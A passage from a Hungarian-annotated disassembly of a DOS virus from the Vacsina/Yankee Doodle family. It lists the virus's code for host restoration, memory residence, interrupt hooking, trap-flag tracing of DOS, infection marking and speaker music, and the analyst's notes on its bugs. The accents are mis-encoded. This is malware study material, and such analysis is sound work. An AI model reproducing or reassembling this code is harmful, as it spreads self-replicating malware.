03EB 8B9F4C03      MOV  BX,[BX+034C]        ;ERE_2_3 (06DA) a file eredeti 2.,3.
						 byteja + 0103
03EF 81EB0301      SUB  BX,0103             ;Megkapjuk az eredeti 2.,3. byteot
03F3 2E            CS:
03F4 891E0101      MOV  [0101],BX           ;Vissza†ll°t†s


     ;Eldînti, hogy az eredeti file eredetileg EXE vagy COM volt-e (elÇg kîrÅlmÇ
						nyesen)

03F8 2E            CS:
03F9 813E00015A4D  CMP  WORD PTR [0100],4D5A;Ha a file EXE volt 040F-en folytato
						dik
03FF 740E          JZ   040F                ;Megj.: Mindegyik vacsin†ban, sît a 
						Yankee Doodleban
0401 2E            CS:                      ;is kÇt EXE k¢dot ellenîriz. Vagy va
						l¢ban megvan ez a
0402 813E00014D5A  CMP  WORD PTR [0100],5A4D;kÇt lehetîsÇg, Vagy az °r¢ nem tudt
						a melyik a j¢ !
0408 7405          JZ   040F


     ;        Ha a file eredetileg COM volt 0100-ra ad¢dik a vezÇrlÇs

040A BB0001        MOV  BX,0100
040D 53            PUSH BX
040E C3            RET                      ;Eredeti COM program futat†sa

     ;---------------------------------------------------------------
     ;             EXE filen†l mÇg relok†lni is kell !
     ;---------------------------------------------------------------
     ;         EXE HEADER-bîl kiolvasott adatok feldolgoz†sa

040F E80000      * CALL 0412                ;bx m†r elveszett
0412 5B          * POP  BX                  ;bx=0412
0413 50            PUSH AX                  ;Eredeti ax megîrzÇse
0414 8CC0          MOV  AX,ES               ;es=cs
0416 051000        ADD  AX,0010             ;ax a file(!) elejÇre mutat (es,ds m
						Çg nem)
0419 8B0E0E01      MOV  CX,[010E]           ;stack t†vols†ga paragrafusban (EXE 
						HEADER-ben)
041D 03C8          ADD  CX,AX               ;+ file kezdete a mem.-ben
041F 894FFB        MOV  [BX-05],CX          ;K¢dra menti !!!
0422 8B0E1601      MOV  CX,[0116]           ;k¢dterÅlet t†vols†ga paragrafusban
0426 03C8          ADD  CX,AX               ;+ file kezdet
0428 894FF7        MOV  [BX-09],CX          ;K¢dra menti !!!
042B 8B0E1001      MOV  CX,[0110]           ;sp kezdeti ÇrtÇke
042F 894FF9        MOV  [BX-07],CX          ;K¢dra menti !!!
0432 8B0E1401      MOV  CX,[0114]           ;ip kezdeti ÇrtÇke
0436 894FF5        MOV  [BX-0B],CX          ;K¢dra menti !!!
0439 8B3E1801      MOV  DI,[0118]           ;Elsî relok†ci¢s bejegyzÇs
043D 8B160801      MOV  DX,[0108]           ;HEADER hossza paragrafufban
0441 B104          MOV  CL,04
0443 D3E2          SHL  DX,CL               ;* 16 (Nem lehet t£lcsorg†s, mert a 
						file hossza <64K)
0445 8B0E0601      MOV  CX,[0106]           ;Relok†ci¢s t†bla hossza (bejegyzÇsb
						en)
0449 E317          JCXZ 0462                ;Ugr†s, ha nincs mit relok†lni


     ;                    Relok†l†s ciklusa

044B 26          * ES:
044C C5B50001      LDS  SI,[DI+0100]        ;Kîvetkezî relok†land¢ sz¢ eltol†sa
0450 83C704        ADD  DI,+04              ;Kîvetkezî relok†ci¢s bejegyzÇs
0453 8CDD          MOV  BP,DS
0455 26            ES:
0456 032E0801      ADD  BP,[0108]           ;HEADER hossza paragrafusban
045A 03E8          ADD  BP,AX               ;ax=a program leendî kezdete a mem.b
						en
045C 8EDD          MOV  DS,BP               ;Melyik szegmensen van a relok†land¢
						 sz¢
045E 0104          ADD  [SI],AX             ;Relok†ci¢
0460 E2E9          LOOP 044B                ;Ciklus cx-szer


     ;         Az EXE program val¢di helyÇre kerÅl a mem¢ri†ban

0462 0E          * PUSH CS
0463 1F            POP  DS                  ;ds=cs  (es=cs)
0464 BF0001        MOV  DI,0100
0467 8BF2          MOV  SI,DX               ;si=header hossza byteokban
0469 81C60001      ADD  SI,0100             ;K¢dterÅlet kezdîc°me
046D 8BCB          MOV  CX,BX               ;bx=0412
046F 2BCE          SUB  CX,SI               ;Ennyi byteot m†soljon !
0471 F3            REPZ                     ;Megj.: Ez egy kicsit tîbb a kelletÇ
						nel, de ez a kuty†t
0472 A4            MOVSB                    ;sem Çrdekli !


     ;   Regiszterek kezdeti ÇrtÇkeinek be†ll°t†sa, a program futtat†sa

0473 58            POP  AX                  ;Eredeti ax
0474 FA            CLI
0475 8E57FB        MOV  SS,[BX-05]          ;ss:sp be†ll°t†sa
0478 8B67F9        MOV  SP,[BX-07]
047B FB            STI
047C FF6FF5        JMP  FAR [BX-0B]         ;cs:ip be†ll°t†sa, az eredeti progra
						m futtat†sa


     ;---------------------------------------------------------------
     ;   Az £j szegmensen itt folytat¢dik a vÇgrehajt†s (03CC-rîl)
     ;---------------------------------------------------------------

     ;Az eredeti programot, PSP-jÇt Çs mem. le°r¢ blokkj†t is h†trÇbb mozgatja

047F BE0000      * MOV  SI,0000             ;Megj.: A kîvetkezî kÇt utas°t†s elh
						agyhat¢ lenn
0482 BF0000        MOV  DI,0000
0485 8BCB          MOV  CX,BX               ;bx=038E
0487 81C182FC      ADD  CX,FC82             ;cx=0016
048B 8CC2          MOV  DX,ES               ;A v°rus £j szegmense
048D 4A            DEC  DX
048E 8EC2          MOV  ES,DX               ;es=£j_cs-1
0490 8CDA          MOV  DX,DS
0492 4A            DEC  DX
0493 8EDA          MOV  DS,DX               ;ds=rÇgi_ds-1
0495 03F1          ADD  SI,CX               ;si=0016
0497 4E            DEC  SI
0498 8BFE          MOV  DI,SI               ;di=si=0015
049A FD            STD
049B F3            REPZ                     ;rÇgi_ds:0005->£j_cs:0005-re 0146 by
						te †tm†sol†sa
049C A4            MOVSB                    ;visszafelÇ (program+PSP+mem¢riale°r
						¢ blokk †tm†
049D FC            CLD                      ;Megj.: £j_cs:0000-0005 rÇsz kÇtszer
						 is †tm†sol¢


     ;            Mem¢riale°r¢ blokk †t°r†sa

049E 2E            CS:
049F 8B9775FC      MOV  DX,[BX+FC75]        ;VIR_HOSSZ (0003) v°rus hossza parag
						rafusokban
04A3 42            INC  DX                  ;dx=006E
04A4 26            ES:
04A5 29160300      SUB  [0003],DX           ;Mem¢riablokk hossz†nak csîkkentÇse
04A9 26            ES:
04AA 8C0E0100      MOV  [0001],CS           ;Gazda az £j_cs


     ;          V°rus visszam†sol†sa a rÇgi szegmens elejÇre

04AE BF0000        MOV  DI,0000
04B1 8BF3          MOV  SI,BX               ;bx=038E
04B3 81C672FC      ADD  SI,FC72             ;si=0000 (v°rus eleje)
04B7 B9E006        MOV  CX,06E0             ;v°rus hossza (byteben)
04BA 1E            PUSH DS
04BB 07            POP  ES                  ;es=rÇgi_ds-1
04BC 0E            PUSH CS
04BD 1F            POP  DS                  ;ds=£j_cs
04BE F3            REPZ                     ;V°rus visszam†sol†sa a szabadd† tet
						t helyre
04BF A4            MOVSB                    ;(PSP-1:0-ra)
04C0 53            PUSH BX


     ;             Az eredeti program £j PSP-t kap

04C1 8CCB          MOV  BX,CS
04C3 B450          MOV  AH,50               ;SET_PSP (bx)
04C5 CD21          INT  21
04C7 5B            POP  BX
04C8 2E            CS:
04C9 8C0E3600      MOV  [0036],CS           ;PSP-n belÅl a megfelelî bejegyzÇs †
						t°r†sa
					    ;(Nem dokument†lt)
04CD 2E            CS:
04CE 8B162C00      MOV  DX,[002C]           ;Environment szegmense
04D2 4A            DEC  DX                  ;Environment mem. le°r¢ blokkja
04D3 8EC2          MOV  ES,DX
04D5 26            ES:
04D6 8C0E0100      MOV  [0001],CS           ;Tulajdonos az £j PSP
04DA 8CD2          MOV  DX,SS
04DC 4A            DEC  DX
04DD 8EDA          MOV  DS,DX               ;ds=ss-1 Environment vÇge


     ;        Az INT 21 Çs az INT 09 lekÇrdezÇse

04DF 53            PUSH BX
04E0 B82135        MOV  AX,3521             ;GET_INT_VECT (es:bx)
04E3 CD21          INT  21
04E5 8C061200      MOV  [0012],ES           ;TISZTA_INT21 (0010)
04E9 891E1000      MOV	[0010],BX
04ED 8C061600      MOV	[0016],ES           ;ERE_INT21 (0014)
04F1 891E1400      MOV	[0014],BX
04F5 B80935        MOV	AX,3509             ;GET_INT_VECT (es:bx)
04F8 CD21          INT	21
04FA 8C061E00      MOV	[001E],ES           ;ERE_INT09 (001C)
04FE 891E1C00      MOV	[001C],BX
0502 5B            POP	BX


     ;             Az INT 21 ellop†sa 00A0-ra

0503 B82125        MOV	AX,2521             ;SET_INT_VECT (ds:dx)
0506 BAA000        MOV	DX,00A0
0509 CD21          INT	21


     ;             Az INT 01 ellop†sa 0535-re

050B B80125        MOV	AX,2501             ;SET_INT_VECT (ds:dx)
050E BA3505        MOV	DX,0535
0511 CD21          INT	21


     ;Az INT 09 ellop†sa 0065-re, s kîzben a DOS val¢di belÇpÇsi pontj†nak megke
						resÇse

0513 BA6500        MOV	DX,0065             ;ds:dx-ben az INT 09 leendî c°me
0516 9C            PUSHF
0517 8BC3          MOV	AX,BX               ;bx=038E
0519 05DC01        ADD	AX,01DC             ;056A Itt fog folytat¢dni a vezÇrlÇs 
						a DOS h°v†s ut†n
051C 0E            PUSH	CS
051D 50            PUSH	AX
051E FA            CLI
051F 9C            PUSHF
0520 58            POP	AX
0521 0D0001        OR	AX,0100             ;Trap bit bebillentÇse
0524 50            PUSH	AX
0525 8BC3          MOV	AX,BX               ;bx=038E
0527 05ADFC        ADD	AX,FCAD             ;003B Ide fog ugrani elîszîr
052A 0E            PUSH	CS
052B 50            PUSH	AX
052C B80925        MOV	AX,2509             ;SET_INT_VECT (ds:dx)
052F C6062A0001    MOV	BYTE PTR [002A],01  ;TRAP_FALG engedÇlyezve
0534 CF            IRET                     ;STACK †llapota:
                                            ;   flag
                                            ;   cs
                                            ;   056A
                                            ;   flag (Trap bit be†ll°tva)
                                            ;   cs
                                            ;   003B   <- sp
     ;Igy a fut†s cs:003B-n folytat¢dik lÇpÇsenkÇnti futtat†ssal ! CS:003B-n egy
						 hossz£ ugr†s
     ;van INT 21 helyett. Igy a DOS az interruptb¢l kilÇpve cs:056A-ra adja a ve
						zÇrlÇst.


     ;---------------------------------------------------------------
     ;                INT 01 ( LÇpÇsenkÇnti futtat†s )
     ;---------------------------------------------------------------
     ;Ha nem engedÇlyezett a lÇpÇsenkÇnti futtat†s tîrli a trap bitet

0535 55          * PUSH	BP
0536 8BEC          MOV	BP,SP
0538 2E            CS:
0539 803E2A0001    CMP	BYTE PTR [002A],01  ;TRAP_FLAG
053E 740D          JZ	054D                ;Ugr†s, ha engedÇlyezett a lÇpÇsenkÇnt
						i futtat†s
0540 816606FFFE  * AND	WORD PTR [BP+06],FEFF ;EgyÇbkÇnt a stacken tîrli a trap b
						itet
0545 2E            CS:
0546 C6062A0000    MOV	BYTE PTR [002A],00  ;TRAP_FLAG = Nem engedÇlyezett a lÇpÇ
						senkÇnti futtat†s
054B 5D            POP	BP
054C CF            IRET


     ;Ha h°v¢_cs>=0300 akkor semmit sem csin†l (mÇg nem jutott el a DOS-ig)

054D 817E040003  * CMP	WORD PTR [BP+04],0300 ;cs ÇrtÇke a stacken (honnan h°vt†k
						 az INT 01-et)
0552 7202          JB	0556
0554 5D            POP	BP
0555 CF            IRET


     ;  Megtal†lta a DOS val¢di belÇpÇsi pontj†t (h°v¢_cs<0300)

0556 53          * PUSH	BX
0557 8B5E02        MOV	BX,[BP+02]          ;h°v¢_ip
055A 2E            CS:
055B 891E1400      MOV	[0014],BX           ;TISZTA_INT21-en belÅl az offset
055F 8B5E04        MOV	BX,[BP+04]          ;h°v¢_cs
0562 2E            CS:
0563 891E1600      MOV	[0016],BX           ;TISZTA_INT21-en belÅl a szegmens
0567 5B            POP	BX
0568 EBD6          JMP	0540        ;VisszatÇrÇs "nem kell tîbb lÇpÇsenkÇnti futt
						at†s" jelzÇssel


     ;---------------------------------------------------------------
     ;  A DOS lÇpÇsenkÇnti futtat†sa ut†n ide tÇr vissza (0534-rîl)
     ;---------------------------------------------------------------
     ;    A gÇp fertîzîtt jelzÇs elhelyezÇse a kor†bbi vacsin†knak

056A C6062A0000  * MOV	BYTE PTR [002A],00  ;TRAP_FLAG = nem kell lÇpÇsenkÇnti fu
						ttat†s
056F B80000        MOV	AX,0000
0572 8EC0          MOV	ES,AX               ;es=0
0574 26            ES:
0575 C706C5007F39  MOV	WORD PTR [00C5],397F;INT 31 vektor†nak 2.,3. byteja (nem 
						dokument†lt DOS
                                            ;interrupt, val¢sz°nÅleg csak az els
						î byteot haszn†lja
                                            ;a DOS). 397F egy ellenîrzî sz¢. A k
						or†bbi verzi¢j£
                                            ;vacsin†knak sz¢l. JelentÇse: a gÇp 
						m†r fertîzîtt.
057B 26            ES:
057C C606C70018    MOV	BYTE PTR [00C7],18  ;Verzi¢sz†m (melyik vacsina van a mem
						¢ri†ban)


     ;         DTA †t†ll°t†sa Çs az eredeti program futtat†sa

0581 8CC8          MOV	AX,CS
0583 8ED8          MOV	DS,AX
0585 B41A          MOV	AH,1A               ;SET_DTA_ADDRESS
0587 BA5000        MOV	DX,0050  ;HIBA !!!   A DTA-nak cs:0080-ra kellene mutatni
						a
058A CD21          INT	21                  ;Megj.:Val¢sz°nÅleg lehagyta az °r¢ a
						 'H'-t a sz†m
058C 2E            CS:                      ;vÇgÇrîl, ugyanis 80D=50H
058D 8B879AFC      MOV	AX,[BX+FC9A]        ;ERE_AX (0028)  Megj.: Teljesen feles
						leges
0591 E939FE        JMP	03CD                ;Ugr†s az eredeti program futtat†s†ra


     ;---------------------------------------------------------------
     ;                         KÇsleltetÇs
     ;---------------------------------------------------------------
     ;  bx = kÇsleltetÇs 0.01 mp-ben

0594 50          * PUSH	AX
0595 53            PUSH	BX
0596 51            PUSH	CX
0597 52            PUSH	DX
0598 B42C          MOV	AH,2C               ;GET_TIME (cx:dx)
059A CD21          INT	21                  ;èll°t¢lag AL-ben a hÇt napj†t adja v
						issza !
059C 8AE5          MOV	AH,CH
059E 02C1          ADD	AL,CL
05A0 02FE          ADD	BH,DH
05A2 02DA          ADD	BL,DL               ;Meddig kell zenÇlni (idîpont)
05A4 80FB64        CMP	BL,64               ;100D sz†zadm†sodperc
05A7 7205          JB	05AE                ;OK
05A9 80EB64        SUB	BL,64               ;T£lcsorg†sn†l
05AC FEC7          INC	BH
05AE 80FF3C      * CMP	BH,3C               ;60 mp
05B1 7205          JB	05B8                ;OK
05B3 80EF3C        SUB	BH,3C               ;T£lcsorg†sn†l
05B6 FEC0          INC	AL
05B8 3C3C        * CMP	AL,3C               ;60 perc
05BA 7204          JB	05C0                ;OK
05BC 2C3C          SUB	AL,3C               ;T£lcsorg†sn†l
05BE FEC4          INC	AH
05C0 80FC18      * CMP	AH,18               ;24 ¢ra
05C3 7502          JNZ	05C7                ;Ok
05C5 2AE4          SUB	AH,AH               ;T£lcsorg†sn†l
05C7 50          * PUSH	AX                  ;Ciklus am°g elÇrjÅk a kijelîlt idîp
						ontot
05C8 B42C          MOV	AH,2C
05CA CD21          INT	21
05CC 58            POP	AX
05CD 3BC8          CMP	CX,AX
05CF 7706          JA	05D7
05D1 72F4          JB	05C7
05D3 3BD3          CMP	DX,BX
05D5 72F0          JB	05C7
05D7 5A          * POP	DX                  ;KÇsleltetÇs vÇge
05D8 59            POP	CX
05D9 5B            POP	BX
05DA 58            POP	AX
05DB C3            RET


     ;---------------------------------------------------------------
     ;                    Egy hang megsz¢laltat†sa
     ;---------------------------------------------------------------
     ; di = hangmagass†g
     ; bl = hanghossz
     ; cl = 0
     ; bh = 0

05DC 50          * PUSH	AX
05DD 51            PUSH	CX
05DE 52            PUSH	DX
05DF 57            PUSH	DI
05E0 B0B6          MOV	AL,B6   ;(10110110) 3. Åzemm¢d, 2. csatorna, alacsonyabb-
						magasabb sorrend
05E2 E643          OUT	43,AL               ;Timer programoz†sa
05E4 BA1400        MOV	DX,0014
05E7 B88032        MOV	AX,3280             ;dx:ax=1323648D
05EA F7F7          DIV	DI                  ;osztva a hangmagass†ggal
05EC E642          OUT	42,AL               ;Als¢ byte
05EE 8AC4          MOV	AL,AH
05F0 E642          OUT	42,AL               ;Felsî byte elkÅldÇse
05F2 E461          IN	AL,61
05F4 8AE0          MOV	AH,AL
05F6 0C03          OR	AL,03               ;Timer engedÇlyezÇse, hangsz¢r¢ be
05F8 E661          OUT	61,AL
05FA 8AC1          MOV	AL,CL               ;cl=0
05FC E895FF        CALL	0594                ;KÇsleltetÇs
05FF 8AC4          MOV	AL,AH
0601 E661          OUT	61,AL               ;Hangsz¢r¢ kikapcs.
0603 5F            POP	DI
0604 5A            POP	DX
0605 59            POP	CX
0606 58            POP	AX
0607 C3            RET


     ;---------------------------------------------------------------
     ;                A megadott dallam elj†tsz†sa
     ;---------------------------------------------------------------

0608 8B3C        * MOV	DI,[SI]
060A 83FFFF        CMP	DI,-01              ;VÇge ?
060D 7411          JZ	0620                ;-> ret
060F 3E            DS:
0610 8A5E00        MOV	BL,[BP+00]          ;Hanghossz
0613 2AC9          SUB	CL,CL               ;CL=0
0615 2AFF          SUB	BH,BH               ;BH=0
0617 E8C2FF        CALL	05DC                ;Egy hang megsz¢laltat†sa
061A 83C602        ADD	SI,+02              ;Kîvetkezî hang
061D 45            INC	BP
061E 75E8          JNZ	0608
0620 C3          * RET


     ;---------------------------------------------------------------
     ;                ZenÇlî rÇsz ( INT 09 h°vja )
     ;---------------------------------------------------------------

0621 BE2B06      * MOV	SI,062B             ;SI a "hangmagass†gok" t†bl†zat†ra mu
						tat
0624 BD9F06        MOV	BP,069F             ;BP a "hanghosszok" t†bl†zat†ra mutat
0627 E8DEFF        CALL	0608
062A C3            RET


     ;---------------------------------------------------------------
     ;              Hangmagass†gok t†bl†zata (062B-069E)
     ;---------------------------------------------------------------

062B 06            PUSH	ES
062C 01060125      ADD	[2501],AX
0630 014901        ADD	[BX+DI+01],CX
0633 06            PUSH	ES
0634 014901        ADD	[BX+DI+01],CX
0637 2501C4        AND	AX,C401
063A 00060106      ADD	[0601],AL
063E 0125          ADD	[DI],SP
0640 014901        ADD	[BX+DI+01],CX
0643 06            PUSH	ES
0644 01060106      ADD	[0601],AX
0648 01060125      ADD	[2501],AX
064C 014901        ADD	[BX+DI+01],CX
064F 5D            POP	BP
0650 014901        ADD	[BX+DI+01],CX
0653 250106        AND	AX,0601
0656 01F6          ADD	SI,SI
0658 00C4          ADD	AH,AL
065A 00DC          ADD	AH,BL
065C 00F6          ADD	DH,DH
065E 00060106      ADD	[0601],AL
0662 01DC          ADD	SP,BX
0664 00F6          ADD	DH,DH
0666 00DC          ADD	AH,BL
0668 00AE00DC      ADD	[BP+DC00],CH
066C 00F6          ADD	DH,DH
066E 000601DC      ADD	[DC01],AL
0672 00C4          ADD	AH,AL
0674 00DC          ADD	AH,BL
0676 00C4          ADD	AH,AL
0678 00AE00A4      ADD	[BP+A400],CH
067C 00AE00C4      ADD	[BP+C400],CH
0680 00DC          ADD	AH,BL
0682 00F6          ADD	DH,DH
0684 00DC          ADD	AH,BL
0686 00AE00DC      ADD	[BP+DC00],CH
068A 00F6          ADD	DH,DH
068C 000601DC      ADD	[DC01],AL
0690 00C4          ADD	AH,AL
0692 000601F6      ADD	[F601],AL
0696 0025          ADD	[DI],AH
0698 01060106      ADD	[0601],AX
069C 01FF          ADD	DI,DI
069E FF


     ;---------------------------------------------------------------
     ;               Hanghosszok t†bl†zata (069F-06D7)
     ;---------------------------------------------------------------


069F 19            CALL	FAR [BX+DI]
06A0 1919          SBB	[BX+DI],BX
06A2 1919          SBB	[BX+DI],BX
06A4 1919          SBB	[BX+DI],BX
06A6 1919          SBB	[BX+DI],BX
06A8 1919          SBB	[BX+DI],BX
06AA 1932          SBB	[BP+SI],SI
06AC 3219          XOR	BL,[BX+DI]
06AE 1919          SBB	[BX+DI],BX
06B0 1919          SBB	[BX+DI],BX
06B2 1919          SBB	[BX+DI],BX
06B4 1919          SBB	[BX+DI],BX
06B6 1919          SBB	[BX+DI],BX
06B8 1932          SBB	[BP+SI],SI
06BA 321A          XOR	BL,[BP+SI]
06BC 191A          SBB	[BP+SI],BX
06BE 1919          SBB	[BX+DI],BX
06C0 1919          SBB	[BX+DI],BX
06C2 191A          SBB	[BP+SI],BX
06C4 191A          SBB	[BP+SI],BX
06C6 1919          SBB	[BX+DI],BX
06C8 191E1A19      SBB	[191A],BX
06CC 1A19          SBB	BL,[BX+DI]
06CE 1919          SBB	[BX+DI],BX
06D0 191E1919      SBB	[1919],BX
06D4 1919          SBB	[BX+DI],BX
06D6 3232          XOR	DH,[BP+SI]


     ;---------------------------------------------------------------
     ;         Az utols¢ 8 byte a v°rus felismerÇsÇt szolg†lja
     ;---------------------------------------------------------------

06D8 ERE_HOSSZ     DW   ?         ;A file eredeti hossza
06DA ERE_2_3       DW   ?         ;Eredeti 2.,3. byte + 0103
06DC AZONOSITO     DW   7AF4      ;Ez alapj†n ismeri fel a fertîzÇst
06DD VERZIO        DB   18        ;Verzi¢sz†m
06DF ERE_1         DB   ?         ;Eredeti elsî byte
     ;Megj.: Ez az utols¢ 8 byte mindegyik Vacsin†n†l (sît a Yankee Doodlen†l is
						) °gy nÇz ki,
     ;kivÇtel a 9-es verzi¢n†l kor†bbiakat, ott ugyanis az eredeti elsî byteot n
						em kell menteni
     ;( mivel csak JMP-pal kezdîdî fileokat fertîznek ).

     ;--------------------------------------------------------------
     ;                       File, v°rus vÇge
     ;--------------------------------------------------------------



MegjegyzÇsek:

- A v°rus "verzi¢sz†m†nak" bevezetÇse înkÇnyes. Egy bizonyos verzi¢ felett m†r v
						al¢sz°nÅleg csak a
  p†ros sz†mokat haszn†lta az °r¢, °gy egy v°rusnak (a VEZERLO-tîl fÅggîen) kÇt 
						verzi¢ja is lehet.
  Tal†n a v°rus ki°rt†s†hoz haszn†lhat¢.
  Pl:    mov   cl,2
         mov   ax,C502    ;VEZERLO megv†ltoztat†sa
         int   21
         mov   ds,file_nev_szegmense
         mov   dx,offset file_nev
         mov   ax,4B00
         int   21

- A Yankee Doodle-b¢l kiderÅl, hogy 34-esnÇl nagyobb verzi¢sz†m m†r Yankee Doodl
						e Çs nem Vacsina.
  EgyÇbkÇnt a kÇt v°rusdinasztia ugyanaz, val¢sz°nÅleg ugyanaz a szemÇly °rta.

- A C5-îs DOS alfunkci¢h°v†s miatt val¢sz°nÅleg Novellben nem fut (az CF-fel, hi
						b†val tÇr vissza
  °gy a v°rus m†r azt hiszi, hogy bent van a mem¢ri†ban).

- A Yankee Doodleben van egy hiba a C603-as funkci¢n†l.Ebben a v°rusban ez mÇg v
						agy m†r nincs benn.
  Nem tudom ez mit jelenthet.

- A Pethî kînyv szerint a 2C DOS funkci¢ †ll°tja AL-t. A v°rusk¢d pedig ezt nem 
						figyeli! (059A-n†l)

- A v°rus a DTA-t rossz helyre †ll°tja (ds:0050-re a ds:0080 helyett). Ez val¢sz
						°nÅleg azÇrt van,
  mert az assembly list†ban a 80 ut†n lemaradt a 'H'.
